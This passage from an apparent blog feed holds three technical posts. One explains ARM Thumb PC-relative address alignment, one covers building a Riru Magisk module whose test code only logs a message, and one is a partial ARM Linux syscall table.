    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在一篇文章（<a href="https://www.52pojie.cn/thread-1486586-1-1.html">实现简易安卓inlinehook</a>）中，Thumb状态下，相对寄存器pc寻址，结果不符合预期。谷歌后找到原因。</p>
<span id="more"></span>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-address-not-4-byte.png"><br>问题指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B3AFB212 ldr r2,[pc,#2]            #预期R2=[pc+4+2=B3AFB218]，结果变为[B3AFB216]</span><br><span class="line">B3AFB216 mov r0, r0                #将pc赋值，替换为 mov r0, r0 方便测试</span><br><span class="line">B3AFB218 xx xx xx xx               #跳回地址，以78563412为例（小端模式）</span><br></pre></td></tr></table></figure>
<p>对应arm指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DF F8 02 20</span><br><span class="line">00 46</span><br><span class="line">12 34 56 78</span><br></pre></td></tr></table></figure>

<p>ldr指令位置为<code>B3AFB212</code>，注意到并未4字节对齐</p>
<p>将指令位置对齐到4字节后，再次反编译，发现跳转地址正确<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-address-4-byte.png"></p>
<h2 id="原因探究"><a href="#原因探究" class="headerlink" title="原因探究"></a>原因探究</h2><p>当pc寄存器被用于相对寄存器寻址操作时（如此处的ldr），会先被对齐到word（在32位CPU中即为4字节）（即使是在Thumb状态下）<br>由于相对PC寻址通常是指定标签而非手动计算偏移，所以这个细节很容易被忽略。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x159a ldr...[pc]</span><br></pre></td></tr></table></figure>
<p><code>0x159a</code>+4 = <code>0x159e</code><br>再将其对齐到word，得到<code>0x159c</code></p>
<p>见<a href="https://stackoverflow.com/questions/29586536/about-arm-pc-value-in-thumb-16-32bits-mixed-instructions-stream">About arm pc value in thumb 16/32bits mixed instructions stream - Stack Overflow</a></p>
<blockquote>
<p>To further complicate matters, when the PC is used as a base register for addressing operations (i.e. adr/ldr/str/etc.) it is always the word-aligned value that is used, even in Thumb state. So, whilst executing a load instruction at 0x159a, the PC register will read as 0x159e, but the base address of ldr…[pc] is Align(0x159e, 4), i.e. 0x159c. Since PC-relative addressing is normally written by specifying a label rather than calculating offsets manually, this detail can be easy to miss.</p>
</blockquote>
<h2 id="指令解析"><a href="#指令解析" class="headerlink" title="指令解析"></a>指令解析</h2><p>再来看问题指令，就可以理解了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B3AFB212 ldr r2,[pc,#2]            #令R2=[Align(pc+4, word)+2]</span><br></pre></td></tr></table></figure>

<p>pc=<code>B3AFB212</code>，pc+4=<code>B3AFB216</code>，再对齐到word，变为<code>B3AFB214</code><br><code>B3AFB214</code>+2 = <code>B3AFB216</code></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title>编译自己的Riru模块</title>
    <url>/2019/11/06/assemble-own-riru-module/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://github.com/RikkaApps/Riru">Riru</a> + <a href="https://github.com/ElderDrivers/EdXposed">EdXposed</a>是目前Android P及以上的一种Xposed解决方案。<br>Riru通过替换<code>libmemtrack.so</code>（会被Zygote加载的一个共享库）从而实现Zygote注入。<br>本文记录了笔者编译Riru模块的过程。</p>
<span id="more"></span>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>电脑：安卓NDK<br>手机：Magisk 19.3，Riru-Core</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="克隆文件到本地"><a href="#克隆文件到本地" class="headerlink" title="克隆文件到本地"></a>克隆文件到本地</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/RikkaApps/Riru</span><br></pre></td></tr></table></figure>
<h3 id="重命名模块"><a href="#重命名模块" class="headerlink" title="重命名模块"></a>重命名模块</h3><p>修改<code>riru-module-template/jni/main/Android.mk</code>中的<code>LOCAL_MODULE</code>，把<code>template</code>替换成自己的模块名<br>打开<code>riru-module-template/build.gradle</code>，定位到<code>def moduleID = </code>，修改为自己的模块名<br><code>def moduleName = </code>后的内容也可以修改</p>
<h3 id="编写测试代码"><a href="#编写测试代码" class="headerlink" title="编写测试代码"></a>编写测试代码</h3><p>打开<code>riru-module-template/jni/main/main.cpp</code><br>首先导入头文件，并定义宏</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGTAG <span class="meta-string">&quot;XHook_Native&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGV(...) __android_log_print(ANDROID_LOG_VERBOSE, LOGTAG , __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG , LOGTAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO , LOGTAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGW(...) __android_log_print(ANDROID_LOG_WARN , LOGTAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR , LOGTAG, __VA_ARGS__)</span></span><br></pre></td></tr></table></figure>
<p>在<code>nativeForkAndSpecializePre</code>中加一句log</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;nativeForkAndSpecializePre Success&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="修改bulid-gradle文件"><a href="#修改bulid-gradle文件" class="headerlink" title="修改bulid.gradle文件"></a>修改bulid.gradle文件</h3><p>在Windows下，文件路径使用的是<code>\</code>，而gradle只认<code>/</code>，所以需要替换<code>ndk-build</code>的参数<br>定位到<code>buildNativeRelease</code>，在<code>&quot;NDK_LIBS_OUT=$libPathRelease&quot;</code>后加上<code>.replace(&quot;\\&quot;, &quot;/&quot;)</code><br>最终变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">commandLine &#x27;cmd&#x27;, &#x27;/c&#x27;, &#x27;ndk-build.cmd&#x27;,</span><br><span class="line">        &#x27;-j8&#x27;,</span><br><span class="line">        &quot;NDK_LIBS_OUT=$libPathRelease&quot;.replace(&quot;\\&quot;, &quot;/&quot;),</span><br><span class="line">        &quot;NDK_OUT=$buildDir/ndkBuild/release/obj&quot;.replace(&quot;\\&quot;, &quot;/&quot;)</span><br></pre></td></tr></table></figure>
<p>PS：需要事先添加NDK到环境变量中，也可在此处手动指定NDK路径</p>
<h3 id="替换magisk-module模板"><a href="#替换magisk-module模板" class="headerlink" title="替换magisk module模板"></a>替换magisk module模板</h3><p>修改<code>template_override</code>下文件，使用EDXposed的模板替换（.prop文件不替换）</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><h4 id="在模块文件夹下进行编译"><a href="#在模块文件夹下进行编译" class="headerlink" title="在模块文件夹下进行编译"></a>在模块文件夹下进行编译</h4><p>直接编译报错，需要在bulid.gradle文件<code>apply plugin: &#39;com.android.library&#39;</code>后添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath &#x27;com.android.tools.build:gradle:3.5.1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">        maven &#123; url &#x27;https://dl.bintray.com/rikkaw/Libraries&#x27; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion 29</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        minSdkVersion 22</span><br><span class="line">        targetSdkVersion 29</span><br><span class="line"></span><br><span class="line">        externalNativeBuild &#123;</span><br><span class="line">            ndkBuild &#123;</span><br><span class="line">                abiFilters &#x27;arm64-v8a&#x27;, &#x27;armeabi-v7a&#x27;</span><br><span class="line">                arguments &quot;NDK_PROJECT_PATH=jni/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line">        ndkBuild &#123;</span><br><span class="line">            path &#x27;jni/Android.mk&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中gradle版本，android SDK版本可参考已有项目进行修改<br>然后执行以下命令编译并打包成Magisk模块（位于release文件夹下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gradlew.bat assembleMagiskRelease</span><br></pre></td></tr></table></figure>
<h4 id="在项目文件夹下进行编译（未测试）"><a href="#在项目文件夹下进行编译（未测试）" class="headerlink" title="在项目文件夹下进行编译（未测试）"></a>在项目文件夹下进行编译（未测试）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gradlew.bat :riru-your-module:assembleMagiskRelease</span><br></pre></td></tr></table></figure>
<p><code>riru-your-module</code>替换成自己模块名</p>
<h3 id="刷入测试"><a href="#刷入测试" class="headerlink" title="刷入测试"></a>刷入测试</h3><p>如果出现问题，可使用<code>adb shellsu</code>命令或进入<code>recovery</code>模式，进入<code>/data/adb/modules</code>文件夹删除模块并重启</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.perfare.net/1444.html">使用Riru修改手游</a><br><a href="https://blog.csdn.net/seafishyls/article/details/53572939">Android Studio导入工程报错 Plugin with id ‘com.android.application’ not found</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM syscall table</title>
    <url>/2022/04/28/arm-syscall-table/</url>
    <content><![CDATA[<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Copy From: <a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md">ChromiumOS Docs - Linux System Call Table</a><br>Also View: <a href="https://cs.android.com/android/platform/superproject/+/master:bionic/libc/kernel/uapi/asm-generic/unistd.h">unistd.h - Android Code Search</a></p>
<h2 id="Calling-Conventions"><a href="#Calling-Conventions" class="headerlink" title="Calling Conventions"></a>Calling Conventions</h2><table>
<thead>
<tr>
<th align="center">arch</th>
<th align="center">syscall NR</th>
<th align="center">return</th>
<th align="center">arg0</th>
<th align="center">arg1</th>
<th align="center">arg2</th>
<th align="center">arg3</th>
<th align="center">arg4</th>
<th align="center">arg5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">arm</td>
<td align="center">r7</td>
<td align="center">r0</td>
<td align="center">r0</td>
<td align="center">r1</td>
<td align="center">r2</td>
<td align="center">r3</td>
<td align="center">r4</td>
<td align="center">r5</td>
</tr>
<tr>
<td align="center">arm64</td>
<td align="center">x8</td>
<td align="center">x0</td>
<td align="center">x0</td>
<td align="center">x1</td>
<td align="center">x2</td>
<td align="center">x3</td>
<td align="center">x4</td>
<td align="center">x5</td>
</tr>
<tr>
<td align="center">x86</td>
<td align="center">eax</td>
<td align="center">eax</td>
<td align="center">ebx</td>
<td align="center">ecx</td>
<td align="center">edx</td>
<td align="center">esi</td>
<td align="center">edi</td>
<td align="center">ebp</td>
</tr>
<tr>
<td align="center">x86_64</td>
<td align="center">rax</td>
<td align="center">rax</td>
<td align="center">rdi</td>
<td align="center">rsi</td>
<td align="center">rdx</td>
<td align="center">r10</td>
<td align="center">r8</td>
<td align="center">r9</td>
</tr>
</tbody></table>
<span id="more"></span>
<h2 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h2><table>
<thead>
<tr>
<th align="center">NR</th>
<th>syscall name</th>
<th align="center">references</th>
<th align="center">%r7</th>
<th>arg0 (%r0)</th>
<th>arg1 (%r1)</th>
<th>arg2 (%r2)</th>
<th>arg3 (%r3)</th>
<th>arg4 (%r4)</th>
<th>arg5 (%r5)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td>restart_syscall</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td>
<td align="center">0x00</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">1</td>
<td>exit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td>
<td align="center">0x01</td>
<td>int error_code</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">2</td>
<td>fork</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td>
<td align="center">0x02</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">3</td>
<td>read</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td>
<td align="center">0x03</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">4</td>
<td>write</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td>
<td align="center">0x04</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">5</td>
<td>open</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td>
<td align="center">0x05</td>
<td>const char *filename</td>
<td>int flags</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">6</td>
<td>close</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td>
<td align="center">0x06</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">7</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x07</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">8</td>
<td>creat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td>
<td align="center">0x08</td>
<td>const char *pathname</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">9</td>
<td>link</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td>
<td align="center">0x09</td>
<td>const char *oldname</td>
<td>const char *newname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">10</td>
<td>unlink</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td>
<td align="center">0x0a</td>
<td>const char *pathname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">11</td>
<td>execve</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td>
<td align="center">0x0b</td>
<td>const char *filename</td>
<td>const char *const *argv</td>
<td>const char *const *envp</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">12</td>
<td>chdir</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td>
<td align="center">0x0c</td>
<td>const char *filename</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">13</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x0d</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">14</td>
<td>mknod</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td>
<td align="center">0x0e</td>
<td>const char *filename</td>
<td>umode_t mode</td>
<td>unsigned dev</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">15</td>
<td>chmod</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td>
<td align="center">0x0f</td>
<td>const char *filename</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">16</td>
<td>lchown</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td>
<td align="center">0x10</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">17</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x11</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">18</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x12</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">19</td>
<td>lseek</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td>
<td align="center">0x13</td>
<td>unsigned int fd</td>
<td>off_t offset</td>
<td>unsigned int whence</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">20</td>
<td>getpid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td>
<td align="center">0x14</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">21</td>
<td>mount</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td>
<td align="center">0x15</td>
<td>char *dev_name</td>
<td>char *dir_name</td>
<td>char *type</td>
<td>unsigned long flags</td>
<td>void *data</td>
<td>-</td>
</tr>
<tr>
<td align="center">22</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x16</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">23</td>
<td>setuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td>
<td align="center">0x17</td>
<td>uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">24</td>
<td>getuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td>
<td align="center">0x18</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">25</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x19</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">26</td>
<td>ptrace</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td>
<td align="center">0x1a</td>
<td>long request</td>
<td>long pid</td>
<td>unsigned long addr</td>
<td>unsigned long data</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">27</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">28</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1c</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">29</td>
<td>pause</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td>
<td align="center">0x1d</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">30</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1e</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">31</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1f</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">32</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x20</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">33</td>
<td>access</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td>
<td align="center">0x21</td>
<td>const char *filename</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">34</td>
<td>nice</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/nice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nice">cs/</a></td>
<td align="center">0x22</td>
<td>int increment</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">35</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x23</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">36</td>
<td>sync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td>
<td align="center">0x24</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">37</td>
<td>kill</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td>
<td align="center">0x25</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">38</td>
<td>rename</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td>
<td align="center">0x26</td>
<td>const char *oldname</td>
<td>const char *newname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">39</td>
<td>mkdir</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td>
<td align="center">0x27</td>
<td>const char *pathname</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">40</td>
<td>rmdir</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td>
<td align="center">0x28</td>
<td>const char *pathname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">41</td>
<td>dup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td>
<td align="center">0x29</td>
<td>unsigned int fildes</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">42</td>
<td>pipe</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td>
<td align="center">0x2a</td>
<td>int *fildes</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">43</td>
<td>times</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td>
<td align="center">0x2b</td>
<td>struct tms *tbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">44</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x2c</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">45</td>
<td>brk</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td>
<td align="center">0x2d</td>
<td>unsigned long brk</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">46</td>
<td>setgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td>
<td align="center">0x2e</td>
<td>gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">47</td>
<td>getgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td>
<td align="center">0x2f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">48</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x30</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">49</td>
<td>geteuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td>
<td align="center">0x31</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">50</td>
<td>getegid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td>
<td align="center">0x32</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">51</td>
<td>acct</td>
